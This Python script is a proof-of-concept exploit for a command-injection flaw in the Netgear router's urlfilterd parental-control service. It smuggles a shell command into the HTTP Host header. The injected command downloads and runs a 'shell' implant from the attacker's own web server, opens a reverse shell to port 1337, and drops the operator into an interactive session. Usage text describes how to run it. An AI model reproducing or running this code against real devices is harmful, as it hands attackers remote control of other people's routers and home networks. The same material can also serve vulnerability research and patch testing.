import requests
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
import select
import sys
from pwn import *

HTTP_PORT = 8000
# Add any banned word to the word list.
ip = "192.168.1.2"
request_host = 'example.com'

BLOCKSIZE = 4096
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"

def interactive_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, 1337))
    s.listen()

    cmd = f"wget http://{ip}:{HTTP_PORT}/shell -O /tmp/shell;chmod +x /tmp/shell;/tmp/shell reverse {ip} 1337&"
    wrapper = f"wget http://{ip}:{HTTP_PORT}/?log=\"$({cmd} 2>&1 | base64)\""
    exec_command_raw(wrapper)

    print("[i] Waiting for incoming connections")
    client, addr = s.accept()
    print(f"[i] {addr} connected")
    interact_pwntools(client)


def interact_pwntools(client):
    r = remote.fromsocket(client)
    r.interactive()

def run_http():
    httpd = HTTPServer((ip, HTTP_PORT), SimpleHTTPRequestHandler)
    httpd.serve_forever()

def exec_command_raw(cmd):
    payload = f"""GET / HTTP/1.1\r
Host: detectportal.firefox.com$({cmd})\r
User-Agent: {USER_AGENT}\r
Accept: */*\r
\r
""".encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request_ip = socket.getaddrinfo(request_host, 80)[0][4][0]
    print(f"[i] Resolved {request_host} = {request_ip}")
    s.connect((request_ip, 80))
    s.send(payload)
    s.recv(1)
    s.close()

def usage():
    print("""Netgear urlfilterd Command injection - V1.0.7.78

Preconditions:
    - The router has parental control enabled, with at least on word on the block list
    - The router has an active internet connection.
    - You have compiled a reverse or bind shell, and placed it in this directory as 'shell'.
      This POC uses an implant that can do both.

Usage:
    $ python3 urlfilterd_exploit.py <attacker ip>

Results:
    Successful exploitation will drop into a reverse shell.
""")

def main():
    web = threading.Thread(target=run_http)
    web.start()
    interactive_shell()
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    else:
        IP = sys.argv[1]
        main()

